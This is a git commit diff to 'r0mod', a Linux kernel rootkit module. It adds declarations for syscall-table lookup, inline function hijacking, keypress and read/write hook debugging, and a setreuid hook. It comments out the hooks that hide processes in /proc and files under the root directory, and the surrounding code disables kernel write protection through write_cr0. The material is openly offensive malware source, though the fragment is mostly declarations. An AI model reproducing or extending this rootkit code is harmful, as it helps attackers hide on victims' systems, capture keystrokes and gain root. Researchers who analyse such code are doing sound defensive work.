c41c75df73e5423c6651f68a630654e6fe4f49a3
ManicSec <>
2017-07-16 04:37:21 +0100

    Default

--- r0mod/r0mod.c
+++ r0mod/r0mod.c
@@ -43,6 +43,68 @@ static int (*root_iterate)(struct file *file, struct dir_context *);
 #endif
 
 unsigned long *sct;
+#ifndef _R0MOD_GLOBAL_H
+#   define _R0MOD_GLOBAL_H
+
+#   include <linux/module.h>
+#   include <linux/version.h>
+#   include <linux/unistd.h>
+#   include <linux/slab.h>
+#   include <linux/list.h>
+#   include <linux/fs.h>
+#   if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
+#       include <generated/autoconf.h>
+#   else
+#       include <linux/autoconf.h>
+#   endif
+
+// Debugging definitions
+#   define __DEBUG__ 1      // General debugging statements
+#   define __DEBUG_HOOK__ 1 // Debugging of inline function hooking
+#   define __DEBUG_KEY__ 1  // Debugging of user keypresses
+#   define __DEBUG_RW__ 1   // Debugging of sys_read and sys_write hooks
+
+// Debugging definitions
+#   if __DEBUG__
+#       define DEBUG(fmt, ...) printk(fmt, ##__VA_ARGS__)
+#   else
+#       define DEBUG(fmt, ...)
+#   endif
+
+#   if __DEBUG_HOOK__
+#       define DEBUG_HOOK(fmt, ...) printk(fmt, ##__VA_ARGS__)
+#   else
+#       define DEBUG_HOOK(fmt, ...)
+#   endif
+
+#   if __DEBUG_KEY__
+#       define DEBUG_KEY(fmt, ...) printk(fmt, ##__VA_ARGS__)
+#   else
+#       define DEBUG_KEY(fmt, ...)
+#   endif
+
+#   if __DEBUG_RW__
+#       define DEBUG_RW(fmt, ...) printk(fmt, ##__VA_ARGS__)
+#   else
+#       define DEBUG_RW(fmt, ...)
+#   endif
+
+extern unsigned long *sct;
+
+#   if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30)
+unsigned long get_symbol(char *name);
+#   endif
+
+char *strnstr(const char *haystack, const char *needle, size_t n);
+void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size);
+void *memstr(const void *haystack, const char *needle, size_t size);
+
+void hijack_start(void *target, void *new);
+void hijack_pause(void *target);
+void hijack_resume(void *target);
+void hijack_stop(void *target);
+
+extern asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
 
 struct s_proc_args
 {
@@ -325,12 +387,12 @@ static int __init r0mod_init(void)
     DEBUG("Search Found: sct @ %lx\n", (unsigned long)sct);
 
     /* Hook /proc for hiding processes */
-    proc_iterate = get_vfs_iterate("/proc");
-    hijack_start(proc_iterate, &n_proc_iterate);
+    //proc_iterate = get_vfs_iterate("/proc");
+    //hijack_start(proc_iterate, &n_proc_iterate);
 
     /* Hook / for hiding files and directories */
-    root_iterate = get_vfs_iterate("/");
-    hijack_start(root_iterate, &n_root_iterate);
+    //root_iterate = get_vfs_iterate("/");
+    //hijack_start(root_iterate, &n_root_iterate);
 
     write_cr0(read_cr0() & (~0x10000));
 
